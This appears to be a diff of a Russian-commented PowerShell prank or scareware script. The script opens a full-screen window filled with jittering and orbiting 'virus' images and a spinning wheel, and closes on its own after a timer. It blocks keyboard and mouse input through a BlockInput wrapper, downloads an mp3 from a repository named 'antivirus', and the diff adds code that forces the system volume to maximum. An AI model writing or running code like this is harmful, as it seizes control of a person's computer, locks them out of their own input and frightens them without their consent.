@@ -39,29 +39,15 @@ public class InputBlocker {
     public static void Unblock() { BlockInput(false); }
 }
 
-public class VirusOrbit {
-    public List<PictureBox> Viruses = new List<PictureBox>();
-    public List<double> Angle  = new List<double>();
-    public List<double> Speed  = new List<double>();
-    public List<double> OrbitX = new List<double>();
-    public List<double> OrbitY = new List<double>();
-    public List<double> CX     = new List<double>();
-    public List<double> CY     = new List<double>();
+public class AudioHelper {
+    [DllImport("winmm.dll")]
+    public static extern int waveOutSetVolume(IntPtr h, uint vol);
+    public static void MaxVolume() { waveOutSetVolume(IntPtr.Zero, 0xFFFFFFFF); }
+}
 
-    public void Add(PictureBox pb, double angle, double speed, double ox, double oy, double cx, double cy) {
-        Viruses.Add(pb); Angle.Add(angle); Speed.Add(speed);
-        OrbitX.Add(ox); OrbitY.Add(oy); CX.Add(cx); CY.Add(cy);
-    }
-
-    public void MoveAll() {
-        for (int i = 0; i < Viruses.Count; i++) {
-            Angle[i] += Speed[i];
-            int nx = (int)(CX[i] + Math.Cos(Angle[i]) * OrbitX[i]) - Viruses[i].Width  / 2;
-            int ny = (int)(CY[i] + Math.Sin(Angle[i]) * OrbitY[i]) - Viruses[i].Height / 2;
-            Viruses[i].Left = nx;
-            Viruses[i].Top  = ny;
-        }
-    }
+// Мини-вирусы — чисто данные, без PictureBox
+public class MiniVirus {
+    public double X, Y, Size, Angle, Speed, OrbitX, OrbitY, CX, CY;
 }
 "@ -ReferencedAssemblies System.Windows.Forms,System.Drawing
 
@@ -77,7 +63,6 @@ try {
         [System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Error)
     exit 1
 }
-
 try {
     iwr "https://raw.githubusercontent.com/sweetvata/antivirus/main/vashsin.mp3" `
         -OutFile $script:songPath -UseBasicParsing -ErrorAction Stop
@@ -89,6 +74,7 @@ try {
 
 $script:virusImg = [System.Drawing.Image]::FromFile($script:imgPath)
 [MCI]::Play($script:songPath)
+[AudioHelper]::MaxVolume()
 
 # ── Конфигурация колеса ────────────────────────────────────────────────────────
 $script:REST  = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('0KDQldCh0KI='))
@@ -110,20 +96,26 @@ $script:clr = @(
     [System.Drawing.Color]::FromArgb(80,200,80),
     [System.Drawing.Color]::FromArgb(200,40,40)
 )
-$script:N     = 10
-$script:sweep = 36.0
-$script:a     = 0.0
-$script:ticks = 0
+$script:N      = 10
+$script:sweep  = 36.0
+$script:a      = 0.0
+$script:ticks  = 0
 $script:stopped = $false
 $script:result  = ''
+$script:pulse   = 0.0
 
-# ── Змейка: позиции для спавна ────────────────────────────────────────────────
-$script:snakeStep = 80      # размер вируса-плитки
-$script:snakeIdx  = 0       # текущая позиция в сетке
+# ── Данные змейки ──────────────────────────────────────────────────────────────
+$script:snakeStep = 90
+$script:snakeIdx  = 0
 $script:snakePositions = [System.Collections.Generic.List[System.Drawing.Point]]::new()
+# Дёргание: каждой плитке случайное смещение которое меняется
+$script:jitterX = [System.Collections.Generic.List[int]]::new()
+$script:jitterY = [System.Collections.Generic.List[int]]::new()
+
+# ── Мини-вирусы (чистые данные, без PictureBox) ───────────────────────────────
+$script:miniViruses = [System.Collections.Generic.List[MiniVirus]]::new()
 
 $rng = New-Object System.Random
-$script:vm = New-Object VirusOrbit
 
 # ── Форма ──────────────────────────────────────────────────────────────────────
 $script:form = New-Object System.Windows.Forms.Form
@@ -137,27 +129,71 @@ $script:panel.Dock      = 'Fill'
 $script:panel.BackColor = 'Black'
 $script:form.Controls.Add($script:panel)
 
-# ── Функция: построить сетку змейки под размер экрана ─────────────────────────
+# ── Построить позиции: два потока из противоположных углов ────────────────────
 function Build-SnakeGrid {
     $W = $script:panel.Width; $H = $script:panel.Height
     $step = $script:snakeStep
-    $cols = [int]([Math]::Ceiling($W / $step))
-    $rows = [int]([Math]::Ceiling($H / $step))
     $script:snakePositions.Clear()
-    for ($row = 0; $row -lt $rows; $row++) {
-        if ($row % 2 -eq 0) {
-            for ($col = 0; $col -lt $cols; $col++) {
-                $script:snakePositions.Add([System.Drawing.Point]::new($col*$step, $row*$step))
-            }
-        } else {
-            for ($col = ($cols-1); $col -ge 0; $col--) {
-                $script:snakePositions.Add([System.Drawing.Point]::new($col*$step, $row*$step))
-            }
+    $script:jitterX.Clear()
+    $script:jitterY.Clear()
+
+    $cols = [int]([Math]::Ceiling($W / $step)) + 1
+    $rows = [int]([Math]::Ceiling($H / $step)) + 1
+
+    # Поток A: из левого верхнего угла, диагонали col+row=const
+    $streamA = [System.Collections.Generic.List[System.Drawing.Point]]::new()
+    for ($diag = 0; $diag -lt ($cols+$rows-1); $diag++) {
+        for ($col = [Math]::Max(0,$diag-$rows+1); $col -le [Math]::Min($diag,$cols-1); $col++) {
+            $row = $diag - $col
+            $streamA.Add([System.Drawing.Point]::new($col*$step, $row*$step))
+        }
+    }
+
+    # Поток B: из правого нижнего угла — зеркально
+    $streamB = [System.Collections.Generic.List[System.Drawing.Point]]::new()
+    for ($diag = 0; $diag -lt ($cols+$rows-1); $diag++) {
+        for ($col = [Math]::Max(0,$diag-$rows+1); $col -le [Math]::Min($diag,$cols-1); $col++) {
+            $row = $diag - $col
+            # Зеркалим: правый нижний угол
+            $streamB.Add([System.Drawing.Point]::new(($cols-1-$col)*$step, ($rows-1-$row)*$step))
+        }
+    }
+
+    # Чередуем A и B
+    $maxLen = [Math]::Max($streamA.Count, $streamB.Count)
+    for ($i = 0; $i -lt $maxLen; $i++) {
+        if ($i -lt $streamA.Count) {
+            $script:snakePositions.Add($streamA[$i])
+            $script:jitterX.Add(0)
+            $script:jitterY.Add(0)
+        }
+        if ($i -lt $streamB.Count) {
+            $script:snakePositions.Add($streamB[$i])
+            $script:jitterX.Add(0)
+            $script:jitterY.Add(0)
         }
     }
 }
 
-# ── Paint: фон + змейка-вирусы (через GDI, без PictureBox) + колесо ──────────
+# ── Добавить мини-вирусы на орбиту ────────────────────────────────────────────
+function Add-MiniViruses($count, $speedMult) {
+    $W = $script:panel.Width; $H = $script:panel.Height
+    $cxF = [double]($W/2); $cyF = [double]($H/2)
+    $baseSpd = [double](8.0 * 2.0 * [Math]::PI / (18000.0/16.0))
+    for ($i = 0; $i -lt $count; $i++) {
+        $mv = New-Object MiniVirus
+        $mv.Size   = $rng.Next(45, 75)
+        $mv.OrbitX = [double]($rng.Next(100, [int]($W*0.46)))
+        $mv.OrbitY = [double]($rng.Next(80,  [int]($H*0.46)))
+        $mv.Angle  = [double]($rng.NextDouble() * 2 * [Math]::PI)
+        $mv.Speed  = [double]($baseSpd * $speedMult * (0.8 + $rng.NextDouble()*0.4))
+        if ($rng.Next(2) -eq 0) { $mv.Speed = -$mv.Speed }
+        $mv.CX = $cxF; $mv.CY = $cyF
+        $script:miniViruses.Add($mv)
+    }
+}
+
+# ── Paint: всё рисуем сами, слои по порядку ───────────────────────────────────
 $script:panel.Add_Paint({
     param($s, $e)
     $g = $e.Graphics
@@ -165,19 +201,20 @@ $script:panel.Add_Paint({
     $g.TextRenderingHint = 'AntiAlias'
     $W = $script:panel.Width; $H = $script:panel.Height
 
-    # Чёрный фон
+    # 1. Чёрный фон
     $g.Clear([System.Drawing.Color]::Black)
 
-    # Рисуем все уже появившиеся вирусы-плитки змейки
-    $step = $script:snakeStep
-    $count = $script:snakeIdx
-    if ($count -gt $script:snakePositions.Count) { $count = $script:snakePositions.Count }
+    # 2. Вирусы-змейка с дёрганием
+    $step  = $script:snakeStep
+    $count = [Math]::Min($script:snakeIdx, $script:snakePositions.Count)
     for ($i = 0; $i -lt $count; $i++) {
         $pt = $script:snakePositions[$i]
-        $g.DrawImage($script:virusImg, $pt.X, $pt.Y, $step, $step)
+        $jx = if ($i -lt $script:jitterX.Count) { $script:jitterX[$i] } else { 0 }
+        $jy = if ($i -lt $script:jitterY.Count) { $script:jitterY[$i] } else { 0 }
+        $g.DrawImage($script:virusImg, $pt.X + $jx, $pt.Y + $jy, $step, $step)
     }
 
-    # ── Колесо поверх ─────────────────────────────────────────────────────────
+    # 3. Колесо поверх
     $r  = [int]([Math]::Min($W,$H) * 0.26)
     $cx = [int]($W/2); $cy = [int]($H/2)
     $x  = $cx-$r; $y = $cy-$r; $d = $r*2
@@ -190,13 +227,11 @@ $script:panel.Add_Paint({
         $g.FillPie($br,$x,$y,$d,$d,[float]($script:a+$n*$script:sweep),[float]$script:sweep)
         $br.Dispose()
     }
-
     $wp = New-Object System.Drawing.Pen([System.Drawing.Color]::White,[float]2)
     for ($n=0; $n -lt $script:N; $n++) {
         $g.DrawPie($wp,$x,$y,$d,$d,[float]($script:a+$n*$script:sweep),[float]$script:sweep)
     }
     $wp.Dispose()
-
     $wp2 = New-Object System.Drawing.Pen([System.Drawing.Color]::White,[float]5)
     $g.DrawEllipse($wp2,$x,$y,$d,$d); $wp2.Dispose()
 
@@ -229,63 +264,59 @@ $script:panel.Add_Paint({
     $g.FillPolygon($ab,$pts); $g.DrawPolygon($ap,$pts)
     $ab.Dispose(); $ap.Dispose()
 
-    # Результат
+    # 4. Мини-вирусы поверх колеса
+    foreach ($mv in $script:miniViruses) {
+        $nx = [int]($mv.CX + [Math]::Cos($mv.Angle)*$mv.OrbitX - $mv.Size/2)
+        $ny = [int]($mv.CY + [Math]::Sin($mv.Angle)*$mv.OrbitY - $mv.Size/2)
+        $g.DrawImage($script:virusImg, $nx, $ny, [int]$mv.Size, [int]$mv.Size)
+    }
+
+    # 5. Результат — поверх ВСЕГО (включая мини-вирусы)
     if ($script:stopped) {
-        $rfn = New-Object System.Drawing.Font('Arial',120,[System.Drawing.FontStyle]::Bold)
+        $psize = [float](120.0 + 40.0 * [Math]::Sin($script:pulse))
+        $rfn = New-Object System.Drawing.Font('Arial', $psize, [System.Drawing.FontStyle]::Bold)
         $rsf = New-Object System.Drawing.StringFormat
         $rsf.Alignment = 'Center'; $rsf.LineAlignment = 'Center'
-        $rrc = New-Object System.Drawing.RectangleF(0,0,[float]$W,[float]$H)
-        $rbg = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(160,0,0,0))
-        $g.FillRectangle($rbg,$rrc); $rbg.Dispose()
-        $rtb = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::Yellow)
-        $g.DrawString($script:result,$rfn,$rtb,$rrc,$rsf)
+        $rrc = New-Object System.Drawing.RectangleF(0, 0, [float]$W, [float]$H)
+        $rbg = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(120,0,0,0))
+        $g.FillRectangle($rbg, $rrc); $rbg.Dispose()
+        $rsh = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(180,0,0,0))
+        $g.DrawString($script:result, $rfn, $rsh,
+            [System.Drawing.RectangleF]::new(8, 8, [float]$W, [float]$H), $rsf)
+        $rsh.Dispose()
+        $rtb = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(255,230,0,0))
+        $g.DrawString($script:result, $rfn, $rtb, $rrc, $rsf)
         $rfn.Dispose(); $rsf.Dispose(); $rtb.Dispose()
     }
 })
 
-# ── Функция: добавить мини-вирусы на орбиту ───────────────────────────────────
-function Add-OrbitViruses($count, $speedMult) {
-    $W = $script:panel.Width; $H = $script:panel.Height
-    $cxF = [double]($W/2); $cyF = [double]($H/2)
-    # ~8 оборотов за 18 сек при 16мс/тик
-    $baseSpd = [double](8.0 * 2.0 * [Math]::PI / (18000.0/16.0))
-    for ($i=0; $i -lt $count; $i++) {
-        $sz = $rng.Next(45,75)
-        $pb = New-Object System.Windows.Forms.PictureBox
-        $pb.Width = $sz; $pb.Height = $sz
-        $pb.SizeMode = 'StretchImage'
-        $pb.Image = $script:virusImg
-        $pb.BackColor = [System.Drawing.Color]::Transparent
-        $script:panel.Controls.Add($pb)
-        $ox  = [double]($rng.Next(120, [int]($W*0.46)))
-        $oy  = [double]($rng.Next(90,  [int]($H*0.46)))
-        $ang = [double]($rng.NextDouble() * 2 * [Math]::PI)
-        $spd = [double]($baseSpd * $speedMult * (0.8 + $rng.NextDouble()*0.4))
-        if ($rng.Next(2) -eq 0) { $spd = -$spd }
-        $script:vm.Add($pb, $ang, $spd, $ox, $oy, $cxF, $cyF)
-    }
-}
-
-# ── Главный таймер: змейка + колесо + орбиты ──────────────────────────────────
+# ── Главный таймер ─────────────────────────────────────────────────────────────
 $t1 = New-Object System.Windows.Forms.Timer
 $t1.Interval = 16
 $t1.Add_Tick({
     $script:ticks++
     $ms = $script:ticks * 16
 
-    # Змейка: новый вирус каждые ~160мс (каждые 10 тиков)
-    if ($ms -le 20000 -and ($script:ticks % 10) -eq 0) {
-        if ($script:snakeIdx -lt $script:snakePositions.Count) {
-            $script:snakeIdx++
+    # Змейка: 4 плитки за тик
+    if ($ms -le 20000 -and $script:snakeIdx -lt $script:snakePositions.Count) {
+        $script:snakeIdx += 4
+    }
+
+    # Дёргание: каждые 3 тика обновляем jitter для всех видимых плиток
+    if ($script:ticks % 3 -eq 0) {
+        $visible = [Math]::Min($script:snakeIdx, $script:jitterX.Count)
+        for ($i = 0; $i -lt $visible; $i++) {
+            $script:jitterX[$i] = $rng.Next(-6, 7)
+            $script:jitterY[$i] = $rng.Next(-6, 7)
         }
     }
 
-    # Орбиты мини-вирусов
-    if ($script:vm.Viruses.Count -gt 0) {
-        $script:vm.MoveAll()
+    # Мини-вирусы: обновить орбиты
+    foreach ($mv in $script:miniViruses) {
+        $mv.Angle += $mv.Speed
     }
 
-    # Колесо крутится 20 сек, потом тормозит
+    # Колесо
     if (-not $script:stopped) {
         if ($ms -lt 10000) {
             $script:a = ($script:a + 12) % 360
@@ -295,10 +326,15 @@ $t1.Add_Tick({
         }
     }
 
+    # Пульсация
+    if ($script:stopped) {
+        $script:pulse = ($script:pulse + 0.12) % ([Math]::PI * 2)
+    }
+
     $script:panel.Invalidate()
 })
 
-# ── tStop: результат + мини-вирусы ────────────────────────────────────────────
+# ── tStop ──────────────────────────────────────────────────────────────────────
 $tStop = New-Object System.Windows.Forms.Timer
 $tStop.Interval = 20000
 $tStop.Add_Tick({
@@ -307,11 +343,10 @@ $tStop.Add_Tick({
     $norm = ((90 - $script:a) % 360 + 360) % 360
     $idx  = [int]([Math]::Floor($norm / $script:sweep)) % $script:N
     $script:result = $script:lbl[$idx]
-    # 50 мини-вирусов с бешеной скоростью (×5)
-    Add-OrbitViruses 50 5.0
+    Add-MiniViruses 200 5.0
 })
 
-# ── tClose: завершение ─────────────────────────────────────────────────────────
+# ── tClose ─────────────────────────────────────────────────────────────────────
 $tClose = New-Object System.Windows.Forms.Timer
 $tClose.Interval = 38000
 $tClose.Add_Tick({
